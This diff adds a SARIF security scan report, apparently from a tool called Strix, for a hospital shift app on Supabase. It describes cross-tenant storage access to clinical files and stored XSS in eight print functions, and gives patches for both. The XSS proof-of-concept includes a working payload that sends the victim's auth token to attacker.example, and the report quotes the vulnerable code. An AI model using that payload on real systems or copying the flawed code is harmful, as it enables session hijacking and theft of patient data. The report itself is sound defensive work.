@@ -1,0 +1,370 @@
+{
+  "version": "2.1.0",
+  "$schema": "https://json.schemastore.org/sarif-2.1.0.json",
+  "runs": [
+    {
+      "tool": {
+        "driver": {
+          "name": "Strix",
+          "informationUri": "https://strix.ai",
+          "rules": [
+            {
+              "id": "CWE-862",
+              "name": "Overly Permissive Storage RLS Policies on `atendimento` Bucket Allow Cross-Tenant Clinical Document Access",
+              "shortDescription": {
+                "text": "Overly Permissive Storage RLS Policies on `atendimento` Bucket Allow Cross-Tenant Clinical Document Access"
+              },
+              "fullDescription": {
+                "text": "The `atendimento` Supabase Storage bucket, which stores private patient clinical attachments (intake forms, documents), is protected by RLS policies that grant **any authenticated user** unrestricted read and write access to every file in the bucket, with no path-based tenant scoping. A plantonista authenticated to Hospital A can freely download clinical documents belonging to Hospital B, or upload arbitrary files into any tenant's path."
+              },
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "help": {
+                "text": "The `atendimento` Supabase Storage bucket, which stores private patient clinical attachments (intake forms, documents), is protected by RLS policies that grant **any authenticated user** unrestricted read and write access to every file in the bucket, with no path-based tenant scoping. A plantonista authenticated to Hospital A can freely download clinical documents belonging to Hospital B, or upload arbitrary files into any tenant's path.\n\nAny authenticated user (plantonista, gestor, or admin from any organization) can read all files stored in the `atendimento` bucket, regardless of which hospital or patient the documents belong to. This constitutes cross-tenant PHI (Protected Health Information) exposure in violation of LGPD and patient confidentiality requirements. An attacker can also upload arbitrary content (including malicious files) to any tenant's document path.\n\nReplace both flat-bucket policies with path-scoped policies that extract the `unidade_id` from the object name (e.g., first path segment) and verify it against the caller's active vinculos using `private.unidades_gestor_plantonista()` or the escala-aware helpers. Follow the pattern already established for the `banners` bucket. Additionally, enforce a canonical path convention such as `{unidade_id}/{paciente_id}/{filename}` and reject uploads that do not match the caller's allowed units.",
+                "markdown": "The `atendimento` Supabase Storage bucket, which stores private patient clinical attachments (intake forms, documents), is protected by RLS policies that grant **any authenticated user** unrestricted read and write access to every file in the bucket, with no path-based tenant scoping. A plantonista authenticated to Hospital A can freely download clinical documents belonging to Hospital B, or upload arbitrary files into any tenant's path.\n\nAny authenticated user (plantonista, gestor, or admin from any organization) can read all files stored in the `atendimento` bucket, regardless of which hospital or patient the documents belong to. This constitutes cross-tenant PHI (Protected Health Information) exposure in violation of LGPD and patient confidentiality requirements. An attacker can also upload arbitrary content (including malicious files) to any tenant's document path.\n\nReplace both flat-bucket policies with path-scoped policies that extract the `unidade_id` from the object name (e.g., first path segment) and verify it against the caller's active vinculos using `private.unidades_gestor_plantonista()` or the escala-aware helpers. Follow the pattern already established for the `banners` bucket. Additionally, enforce a canonical path convention such as `{unidade_id}/{paciente_id}/{filename}` and reject uploads that do not match the caller's allowed units."
+              },
+              "properties": {
+                "security-severity": "7.1",
+                "tags": [
+                  "security",
+                  "CWE-862",
+                  "stride:E"
+                ]
+              },
+              "helpUri": "https://cwe.mitre.org/data/definitions/862.html"
+            },
+            {
+              "id": "CWE-79",
+              "name": "Stored XSS via Unescaped Patient Data in document.write() Print Functions",
+              "shortDescription": {
+                "text": "Stored XSS via Unescaped Patient Data in document.write() Print Functions"
+              },
+              "fullDescription": {
+                "text": "Eight medical document print functions inject user-controlled patient data (name, allergies, diagnosis, prescriptions, exam requests, clinical notes) directly into `document.write()` template strings without HTML encoding. Because patient records are loaded from the shared Supabase database, any authenticated user who can write to the `pacientes` table can plant an XSS payload that executes whenever another authenticated user prints a document for that patient."
+              },
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "help": {
+                "text": "Eight medical document print functions inject user-controlled patient data (name, allergies, diagnosis, prescriptions, exam requests, clinical notes) directly into `document.write()` template strings without HTML encoding. Because patient records are loaded from the shared Supabase database, any authenticated user who can write to the `pacientes` table can plant an XSS payload that executes whenever another authenticated user prints a document for that patient.\n\nA malicious actor who can create or modify a patient record can inject arbitrary JavaScript that executes in the same-origin print popup (`window.open('', '_blank')`). Because the popup inherits the opener's origin, it has full read access to `localStorage`, including the Supabase session token persisted there by the `@supabase/supabase-js` client. Exploitation enables session hijacking, medical-record exfiltration, and authenticated API actions on behalf of the victim without requiring any additional user interaction beyond clicking \"Imprimir\".\n\nApply `escapeHtml()` — which already exists in `src/lib/utils.ts` and is correctly used in `ExportarTab.tsx` — to every patient field before it is interpolated into a `document.write()` template string. This must be done in all eight affected components.\n\nFor fields that convert newlines to `<br>` tags (e.g., `evolucao.texto.replace(/\\n/g, '<br>')`), escape the value first and then replace the escaped newlines: `escapeHtml(text).replace(/\\n/g, '<br>')`. The pattern already used in `ExportarTab.tsx` (lines 139, 163, 179) is the correct reference.\n\nAdditionally, consider replacing `document.write()` with `document.open(); document.write(...); document.close()` on the opener side, or — better — build the print content as a Blob URL or a sandboxed iframe to isolate it from the main window's storage. As a defence-in-depth measure, set a strict `Content-Security-Policy` header on the application that blocks inline script unless nonce/hash-protected.",
+                "markdown": "Eight medical document print functions inject user-controlled patient data (name, allergies, diagnosis, prescriptions, exam requests, clinical notes) directly into `document.write()` template strings without HTML encoding. Because patient records are loaded from the shared Supabase database, any authenticated user who can write to the `pacientes` table can plant an XSS payload that executes whenever another authenticated user prints a document for that patient.\n\nA malicious actor who can create or modify a patient record can inject arbitrary JavaScript that executes in the same-origin print popup (`window.open('', '_blank')`). Because the popup inherits the opener's origin, it has full read access to `localStorage`, including the Supabase session token persisted there by the `@supabase/supabase-js` client. Exploitation enables session hijacking, medical-record exfiltration, and authenticated API actions on behalf of the victim without requiring any additional user interaction beyond clicking \"Imprimir\".\n\nApply `escapeHtml()` — which already exists in `src/lib/utils.ts` and is correctly used in `ExportarTab.tsx` — to every patient field before it is interpolated into a `document.write()` template string. This must be done in all eight affected components.\n\nFor fields that convert newlines to `<br>` tags (e.g., `evolucao.texto.replace(/\\n/g, '<br>')`), escape the value first and then replace the escaped newlines: `escapeHtml(text).replace(/\\n/g, '<br>')`. The pattern already used in `ExportarTab.tsx` (lines 139, 163, 179) is the correct reference.\n\nAdditionally, consider replacing `document.write()` with `document.open(); document.write(...); document.close()` on the opener side, or — better — build the print content as a Blob URL or a sandboxed iframe to isolate it from the main window's storage. As a defence-in-depth measure, set a strict `Content-Security-Policy` header on the application that blocks inline script unless nonce/hash-protected."
+              },
+              "properties": {
+                "security-severity": "8.7",
+                "tags": [
+                  "security",
+                  "CWE-79",
+                  "stride:T",
+                  "stride:I"
+                ]
+              },
+              "helpUri": "https://cwe.mitre.org/data/definitions/79.html"
+            }
+          ],
+          "version": "1.5.3"
+        }
+      },
+      "results": [
+        {
+          "ruleId": "CWE-862",
+          "ruleIndex": 0,
+          "level": "error",
+          "message": {
+            "text": "Overly Permissive Storage RLS Policies on `atendimento` Bucket Allow Cross-Tenant Clinical Document Access\n\nThe `atendimento` Supabase Storage bucket, which stores private patient clinical attachments (intake forms, documents), is protected by RLS policies that grant **any authenticated user** unrestricted read and write access to every file in the bucket, with no path-based tenant scoping. A plantonista authenticated to Hospital A can freely download clinical documents belonging to Hospital B, or upload arbitrary files into any tenant's path."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "supabase/migrations/20260815000012_fase2_bucket_atendimento.sql"
+                },
+                "region": {
+                  "startLine": 11,
+                  "endLine": 19
+                }
+              },
+              "message": {
+                "text": "Replace flat-bucket policies with path-scoped, tenant-aware policies"
+              }
+            },
+            {
+              "logicalLocations": [
+                {
+                  "fullyQualifiedName": "/storage/v1/object/atendimento/",
+                  "kind": "endpoint"
+                }
+              ]
+            }
+          ],
+          "fixes": [
+            {
+              "artifactChanges": [
+                {
+                  "artifactLocation": {
+                    "uri": "supabase/migrations/20260815000012_fase2_bucket_atendimento.sql"
+                  },
+                  "replacements": [
+                    {
+                      "deletedRegion": {
+                        "startLine": 11,
+                        "endLine": 19
+                      },
+                      "insertedContent": {
+                        "text": "DROP POLICY IF EXISTS \"atendimento_upload\" ON storage.objects;\nCREATE POLICY \"atendimento_upload\" ON storage.objects\n  FOR INSERT TO authenticated\n  WITH CHECK (\n    bucket_id = 'atendimento'\n    AND (\n      private.eh_super_admin()\n      OR (\n        -- First path segment must be a unidade_id the caller has access to\n        (regexp_match(name, '^([^/]+)/'))[1]::uuid\n          IN (SELECT private.unidades_gestor_plantonista())\n      )\n    )\n  );\n\nDROP POLICY IF EXISTS \"atendimento_read\" ON storage.objects;\nCREATE POLICY \"atendimento_read\" ON storage.objects\n  FOR SELECT TO authenticated\n  USING (\n    bucket_id = 'atendimento'\n    AND (\n      private.eh_super_admin()\n      OR private.papel_na_unidade(\n           (regexp_match(name, '^([^/]+)/'))[1]::uuid\n         ) IN ('gestor', 'plantonista')\n      OR (regexp_match(name, '^([^/]+)/'))[1]::uuid\n           IN (SELECT private.unidades_gestor_plantonista())\n    )\n  );"
+                      }
+                    }
+                  ]
+                }
+              ],
+              "description": {
+                "text": "Replace both flat-bucket policies with path-scoped policies that extract the `unidade_id` from the object name (e.g., first path segment) and verify it against the caller's active vinculos using `private.unidades_gestor_plantonista()` or the escala-aware helpers. Follow the pattern already established for the `banners` bucket. Additionally, enforce a canonical path convention such as `{unidade_id}/{paciente_id}/{filename}` and reject uploads that do not match the caller's allowed units.",
+                "markdown": "Replace both flat-bucket policies with path-scoped policies that extract the `unidade_id` from the object name (e.g., first path segment) and verify it against the caller's active vinculos using `private.unidades_gestor_plantonista()` or the escala-aware helpers. Follow the pattern already established for the `banners` bucket. Additionally, enforce a canonical path convention such as `{unidade_id}/{paciente_id}/{filename}` and reject uploads that do not match the caller's allowed units."
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "primaryLocationLineHash": "8f149eb56b1d23a4f9b3ed3f08a42fc190ffc21f243c626cad8d8a5abc9b10be"
+          },
+          "properties": {
+            "security-severity": "7.1",
+            "strix_vuln_class_hash": "a91fe809e67a520e5c5c3fd638b0144a18d67c2af9417392e8ebf02c07aa53e4",
+            "strix": {
+              "id": "vuln-0001",
+              "severity": "high",
+              "cvss": 7.1,
+              "timestamp": "2026-08-20 03:14:00 UTC",
+              "target": "https://saqjrjtrkzkswsxxvdxn.supabase.co / repository /workspace/chefe-coruja",
+              "endpoint": "/storage/v1/object/atendimento/",
+              "method": "GET",
+              "cwe": "CWE-862",
+              "impact": "Any authenticated user (plantonista, gestor, or admin from any organization) can read all files stored in the `atendimento` bucket, regardless of which hospital or patient the documents belong to. This constitutes cross-tenant PHI (Protected Health Information) exposure in violation of LGPD and patient confidentiality requirements. An attacker can also upload arbitrary content (including malicious files) to any tenant's document path.",
+              "technical_analysis": "Migration `20260815000012_fase2_bucket_atendimento.sql` creates two storage policies on `storage.objects` for the `atendimento` bucket:\n\n```sql title=supabase/migrations/20260815000012_fase2_bucket_atendimento.sql startLineNumber=11 endLineNumber=19\nDROP POLICY IF EXISTS \"atendimento_upload\" ON storage.objects;\nCREATE POLICY \"atendimento_upload\" ON storage.objects\n  FOR INSERT TO authenticated\n  WITH CHECK (bucket_id = 'atendimento');\n\nDROP POLICY IF EXISTS \"atendimento_read\" ON storage.objects;\nCREATE POLICY \"atendimento_read\" ON storage.objects\n  FOR SELECT TO authenticated\n  USING (bucket_id = 'atendimento');\n```\n\nBoth policies check **only** `bucket_id = 'atendimento'`. There is no check on `name` (the object path), `auth.uid()`, or any join against `unidades`/`vinculos` tables to verify the caller belongs to the same tenant as the document. The bucket is marked `public = false`, so URL-based access requires authentication — but once authenticated, access is fully open.\n\nBy contrast, the `banners` bucket correctly parses the unit UUID from the file path (`(regexp_match(name, '^([^/]+)/'))[1]::uuid`) and validates it against the caller's vinculos. The `atendimento` bucket lacks any equivalent scoping.\n\nNo subsequent migration overrides these policies.",
+              "remediation_steps": "Replace both flat-bucket policies with path-scoped policies that extract the `unidade_id` from the object name (e.g., first path segment) and verify it against the caller's active vinculos using `private.unidades_gestor_plantonista()` or the escala-aware helpers. Follow the pattern already established for the `banners` bucket. Additionally, enforce a canonical path convention such as `{unidade_id}/{paciente_id}/{filename}` and reject uploads that do not match the caller's allowed units.",
+              "poc": {
+                "description": "1. Log in as User A (e.g., a plantonista authenticated to Unit 1, Organization X).\n2. Upload a sensitive clinical document via the Supabase Storage API to the `atendimento` bucket at any path.\n3. Log in as User B (a plantonista authenticated to Unit 2, Organization Y — a completely different tenant).\n4. Issue a Storage `list` or `download` request authenticated as User B targeting files uploaded by User A:\n   `GET /storage/v1/object/atendimento/<any_path>`\n5. User B successfully retrieves the document, demonstrating cross-tenant PHI exposure.\n6. Conversely, User B can also upload files to paths owned by Organization X (`POST /storage/v1/object/atendimento/org-x/...`).",
+                "script_available": true
+              }
+            }
+          }
+        },
+        {
+          "ruleId": "CWE-79",
+          "ruleIndex": 1,
+          "level": "error",
+          "message": {
+            "text": "Stored XSS via Unescaped Patient Data in document.write() Print Functions\n\nEight medical document print functions inject user-controlled patient data (name, allergies, diagnosis, prescriptions, exam requests, clinical notes) directly into `document.write()` template strings without HTML encoding. Because patient records are loaded from the shared Supabase database, any authenticated user who can write to the `pacientes` table can plant an XSS payload that executes whenever another authenticated user prints a document for that patient."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "src/pages/plantao/atendimento/ReceituarioMedico.tsx"
+                },
+                "region": {
+                  "startLine": 148,
+                  "endLine": 169,
+                  "snippet": {
+                    "text": "printWindow.document.write(`\n      <html><head><title>Receituário</title>\n      ...\n          <div class=\"rec-cabec\"><span><strong>Paciente:</strong> ${dados.paciente.nome || '____________________'}</span>...\n          ${alergia}\n          ...<tbody>${linhas}</tbody>...\n          ${dados.receita.obs ? `<div class=\"obs\">Observações: ${dados.receita.obs}</div>` : ''}\n        </div></div>\n      </body></html>\n    `)"
+                  }
+                }
+              },
+              "message": {
+                "text": "ReceituarioMedico — patient name, allergies, medication items, observations unescaped in document.write()"
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "src/pages/plantao/internacao/EvolucaoTab.tsx"
+                },
+                "region": {
+                  "startLine": 61,
+                  "endLine": 99,
+                  "snippet": {
+                    "text": "const alergiaHtml =\n      dados.alergias && dados.alergias.toUpperCase() !== 'NEGA'\n        ? `<div ...>⚠️ ALERGIA: ${dados.alergias.toUpperCase()} ⚠️</div>`\n        : ''\n    const textoHtml = evolucao.texto.replace(/\\n/g, '<br>')"
+                  }
+                }
+              },
+              "message": {
+                "text": "EvolucaoTab — allergy string and clinical note text unescaped; fix: escape before newline replacement"
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "src/pages/plantao/internacao/ExamesTab.tsx"
+                },
+                "region": {
+                  "startLine": 57,
+                  "endLine": 65,
+                  "snippet": {
+                    "text": "const paciente = dados.nome.trim().toUpperCase() || 'PACIENTE NÃO IDENTIFICADO'\n    ...\n    const listaHtml = linhas.map((l) => `<div ...>• ${l}</div>`).join('')"
+                  }
+                }
+              },
+              "message": {
+                "text": "ExamesTab — patient name and exam lines unescaped"
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "src/pages/plantao/atendimento/PedidoExames.tsx"
+                },
+                "region": {
+                  "startLine": 107,
+                  "endLine": 115,
+                  "snippet": {
+                    "text": "const paciente = dados.paciente.nome.trim().toUpperCase() || 'PACIENTE NÃO IDENTIFICADO'\n    ...\n    const listaHtml = linhas.map((l) => `<div ...>• ${l}</div>`).join('')"
+                  }
+                }
+              },
+              "message": {
+                "text": "PedidoExames — patient name and exam list unescaped"
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "src/pages/plantao/internacao/InternacaoTab.tsx"
+                },
+                "region": {
+                  "startLine": 99,
+                  "endLine": 107,
+                  "snippet": {
+                    "text": "const rows = campos\n      .map((c) => {\n        const val = aih[c.nome]\n        if (c.textarea) {\n          return `<div ...><div ...>${c.rotulo}</div><div ...>${(val || '&nbsp;').replace(/\\n/g, '<br>')}</div></div>`\n        }\n        return `<div ...><div ...>${c.rotulo}</div><div ...>${val || '&nbsp;'}</div></div>`\n      })\n      .join('')"
+                  }
+                }
+              },
+              "message": {
+                "text": "InternacaoTab — all AIH field values (val) unescaped; textarea rows use .replace() on raw value"
+              }
+            },
+            {
+              "logicalLocations": [
+                {
+                  "fullyQualifiedName": "/plantao/* — all authenticated print routes consuming DadosPaciente",
+                  "kind": "endpoint"
+                }
+              ]
+            }
+          ],
+          "fixes": [
+            {
+              "artifactChanges": [
+                {
+                  "artifactLocation": {
+                    "uri": "src/pages/plantao/atendimento/ReceituarioMedico.tsx"
+                  },
+                  "replacements": [
+                    {
+                      "deletedRegion": {
+                        "startLine": 148,
+                        "endLine": 169
+                      },
+                      "insertedContent": {
+                        "text": "import { escapeHtml } from '@/lib/utils'\n    // Apply escapeHtml() to every patient field before interpolation:\n    // e.g. ${escapeHtml(dados.paciente.nome) || '____________________'}\n    // e.g. alergia = `...ALERGIA: ${escapeHtml(dados.paciente.alergias.toUpperCase())}...`\n    // e.g. linhas: `<strong>${escapeHtml(i.medicamento.toUpperCase())}</strong>...`\n    // e.g. obs: `...Observações: ${escapeHtml(dados.receita.obs)}</div>`"
+                      }
+                    }
+                  ]
+                },
+                {
+                  "artifactLocation": {
+                    "uri": "src/pages/plantao/internacao/EvolucaoTab.tsx"
+                  },
+                  "replacements": [
+                    {
+                      "deletedRegion": {
+                        "startLine": 61,
+                        "endLine": 99
+                      },
+                      "insertedContent": {
+                        "text": "import { escapeHtml } from '@/lib/utils'\n    const alergiaHtml =\n      dados.alergias && dados.alergias.toUpperCase() !== 'NEGA'\n        ? `<div style=\"background:#dc2626;color:#fff;padding:4px;text-align:center;font-weight:800;font-size:11px;margin-bottom:8px;\">⚠️ ALERGIA: ${escapeHtml(dados.alergias.toUpperCase())} ⚠️</div>`\n        : ''\n    const cabecalho = evolucao.tipo === 'admissao' ? 'TERMO DE ADMISSÃO' : 'EVOLUÇÃO MÉDICA'\n    const textoHtml = escapeHtml(evolucao.texto).replace(/\\n/g, '<br>')"
+                      }
+                    }
+                  ]
+                },
+                {
+                  "artifactLocation": {
+                    "uri": "src/pages/plantao/internacao/ExamesTab.tsx"
+                  },
+                  "replacements": [
+                    {
+                      "deletedRegion": {
+                        "startLine": 57,
+                        "endLine": 65
+                      },
+                      "insertedContent": {
+                        "text": "import { escapeHtml } from '@/lib/utils'\n    const paciente = escapeHtml(dados.nome.trim().toUpperCase()) || 'PACIENTE NÃO IDENTIFICADO'\n    const data = fmtData(dados.dataAtual)\n    const linhas = texto.split(/\\n+/).map((l) => l.replace(/^[-*•]\\s*/, '')).filter(Boolean)\n    const listaHtml = linhas.map((l) => `<div style=\"margin-bottom:6px;\">• ${escapeHtml(l)}</div>`).join('')"
+                      }
+                    }
+                  ]
+                },
+                {
+                  "artifactLocation": {
+                    "uri": "src/pages/plantao/atendimento/PedidoExames.tsx"
+                  },
+                  "replacements": [
+                    {
+                      "deletedRegion": {
+                        "startLine": 107,
+                        "endLine": 115
+                      },
+                      "insertedContent": {
+                        "text": "import { escapeHtml } from '@/lib/utils'\n    const paciente = escapeHtml(dados.paciente.nome.trim().toUpperCase()) || 'PACIENTE NÃO IDENTIFICADO'\n    const data = fmtData(dados.paciente.dataAtual)\n    const linhas = texto.split(/\\n+/).map((l) => l.replace(/^[-*•]\\s*/, '')).filter(Boolean)\n    const listaHtml = linhas.map((l) => `<div style=\"margin-bottom:6px;\">• ${escapeHtml(l)}</div>`).join('')"
+                      }
+                    }
+                  ]
+                },
+                {
+                  "artifactLocation": {
+                    "uri": "src/pages/plantao/internacao/InternacaoTab.tsx"
+                  },
+                  "replacements": [
+                    {
+                      "deletedRegion": {
+                        "startLine": 99,
+                        "endLine": 107
+                      },
+                      "insertedContent": {
+                        "text": "import { escapeHtml } from '@/lib/utils'\n    const rows = campos\n      .map((c) => {\n        const val = aih[c.nome]\n        if (c.textarea) {\n          return `<div class=\"row\"><div class=\"label\">${escapeHtml(c.rotulo)}</div><div class=\"valor ta\">${(escapeHtml(val) || '&nbsp;').replace(/\\n/g, '<br>')}</div></div>`\n        }\n        return `<div class=\"row\"><div class=\"label\">${escapeHtml(c.rotulo)}</div><div class=\"valor\">${escapeHtml(val) || '&nbsp;'}</div></div>`\n      })\n      .join('')"
+                      }
+                    }
+                  ]
+                }
+              ],
+              "description": {
+                "text": "Apply `escapeHtml()` — which already exists in `src/lib/utils.ts` and is correctly used in `ExportarTab.tsx` — to every patient field before it is interpolated into a `document.write()` template string. This must be done in all eight affected components.\n\nFor fields that convert newlines to `<br>` tags (e.g., `evolucao.texto.replace(/\\n/g, '<br>')`), escape the value first and then replace the escaped newlines: `escapeHtml(text).replace(/\\n/g, '<br>')`. The pattern already used in `ExportarTab.tsx` (lines 139, 163, 179) is the correct reference.\n\nAdditionally, consider replacing `document.write()` with `document.open(); document.write(...); document.close()` on the opener side, or — better — build the print content as a Blob URL or a sandboxed iframe to isolate it from the main window's storage. As a defence-in-depth measure, set a strict `Content-Security-Policy` header on the application that blocks inline script unless nonce/hash-protected.",
+                "markdown": "Apply `escapeHtml()` — which already exists in `src/lib/utils.ts` and is correctly used in `ExportarTab.tsx` — to every patient field before it is interpolated into a `document.write()` template string. This must be done in all eight affected components.\n\nFor fields that convert newlines to `<br>` tags (e.g., `evolucao.texto.replace(/\\n/g, '<br>')`), escape the value first and then replace the escaped newlines: `escapeHtml(text).replace(/\\n/g, '<br>')`. The pattern already used in `ExportarTab.tsx` (lines 139, 163, 179) is the correct reference.\n\nAdditionally, consider replacing `document.write()` with `document.open(); document.write(...); document.close()` on the opener side, or — better — build the print content as a Blob URL or a sandboxed iframe to isolate it from the main window's storage. As a defence-in-depth measure, set a strict `Content-Security-Policy` header on the application that blocks inline script unless nonce/hash-protected."
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "primaryLocationLineHash": "e05377ac917d64a4be777ec3b934877fc605385cbd047d11b41784e8e6906230"
+          },
+          "properties": {
+            "security-severity": "8.7",
+            "strix_vuln_class_hash": "841d192a59e6812ef6a771cf84fa82963f628884ed58037aa16b7e6cdd3695f8",
+            "strix": {
+              "id": "vuln-0002",
+              "severity": "high",
+              "cvss": 8.7,
+              "timestamp": "2026-08-20 03:14:18 UTC",
+              "target": "https://github.com/chefe-coruja (local: /workspace/chefe-coruja)",
+              "endpoint": "/plantao/* — all authenticated print routes consuming DadosPaciente",
+              "cwe": "CWE-79",
+              "impact": "A malicious actor who can create or modify a patient record can inject arbitrary JavaScript that executes in the same-origin print popup (`window.open('', '_blank')`). Because the popup inherits the opener's origin, it has full read access to `localStorage`, including the Supabase session token persisted there by the `@supabase/supabase-js` client. Exploitation enables session hijacking, medical-record exfiltration, and authenticated API actions on behalf of the victim without requiring any additional user interaction beyond clicking \"Imprimir\".",
+              "technical_analysis": "The `imprimir()` function in each of the following components calls `window.open('', '_blank')` to spawn a print popup, then populates it via `printWindow.document.write(html)` where `html` is a template-literal string that embeds patient fields **without HTML encoding**:\n\n**Affected files and unescaped sinks:**\n\n- `src/pages/plantao/atendimento/ReceituarioMedico.tsx` (line 148): `dados.paciente.nome`, `dados.paciente.alergias`, per-item `medicamento`, `dose`, `posologia`, `quantidade`, `receita.obs`\n- `src/pages/plantao/atendimento/Encaminhamento.tsx` (line 95): `dados.paciente.nome`, `dados.paciente.diagnostico`, `encaminhamento.resumo`\n- `src/pages/plantao/atendimento/PedidoExames.tsx` (line 113): `dados.paciente.nome`, each exam line\n- `src/pages/plantao/atendimento/AtestadoMedico.tsx` (line 87): `dados.paciente.nome`, `atestado.texto`\n- `src/pages/plantao/internacao/PrescricaoTab.tsx` (line 144): `dados.nome`, `dados.alergias`, `prescricao.obs`\n- `src/pages/plantao/internacao/EvolucaoTab.tsx` (line 71): `dados.nome`, `dados.nascimento`, `dados.leito`, `dados.diagnostico`, `dados.alergias`, `evolucao.texto`\n- `src/pages/plantao/internacao/ExamesTab.tsx` (line 67): `dados.nome`, each exam line\n- `src/pages/plantao/internacao/InternacaoTab.tsx` (line 106): all AIH field values (`aih[c.nome]`) — textarea rows call `.replace(/\\n/g, '<br>')` on the raw value without prior escaping\n\nPatient data reaches these sinks through `DadosPaciente` (component search loads `pacienteEncontrado.nome` etc. from Supabase `pacientes` table) or from `localStorage` drafts (rascunho) that may themselves have been seeded from DB data.\n\nContrast with `ExportarTab.tsx`, which correctly wraps every patient field in `escapeHtml()` before building the same-style HTML template — the helper exists in `src/lib/utils.ts` and is not applied in any of the eight print functions above.\n\nThe popup window opened with `window.open('', '_blank')` receives the opener's origin (`about:blank` inherits the creating document's origin), so injected script can read `window.localStorage` directly (same origin) and access the `sb-*-auth-token` key written by the Supabase JS client.",
+              "remediation_steps": "Apply `escapeHtml()` — which already exists in `src/lib/utils.ts` and is correctly used in `ExportarTab.tsx` — to every patient field before it is interpolated into a `document.write()` template string. This must be done in all eight affected components.\n\nFor fields that convert newlines to `<br>` tags (e.g., `evolucao.texto.replace(/\\n/g, '<br>')`), escape the value first and then replace the escaped newlines: `escapeHtml(text).replace(/\\n/g, '<br>')`. The pattern already used in `ExportarTab.tsx` (lines 139, 163, 179) is the correct reference.\n\nAdditionally, consider replacing `document.write()` with `document.open(); document.write(...); document.close()` on the opener side, or — better — build the print content as a Blob URL or a sandboxed iframe to isolate it from the main window's storage. As a defence-in-depth measure, set a strict `Content-Security-Policy` header on the application that blocks inline script unless nonce/hash-protected.",
+              "poc": {
+                "description": "1. Log in as any authenticated user who has write access to the `pacientes` table (e.g., a plantonista who can register a new patient).\n2. Create or edit a patient record and set the **Nome** field to the payload: `<img src=x onerror=\"window.opener.fetch('https://attacker.example/exfil?t='+encodeURIComponent(window.localStorage.getItem(Object.keys(window.localStorage).find(k=>k.includes('auth'))))||'none')\">`.\n3. As a victim (another authenticated user), search for that patient in any of the medical document tabs (e.g., Receituário, Encaminhamento, Prescrição).\n4. Click **Imprimir**.\n5. Observe the JavaScript execute in the print popup and the Supabase session token exfiltrated to the attacker's endpoint.\n6. The attack works identically with the **Alergias**, **Diagnóstico**, **Observações**, or any free-text prescription/exam field.",
+                "script_available": true
+              }
+            }
+          }
+        }
+      ]
+    }
+  ]
+}
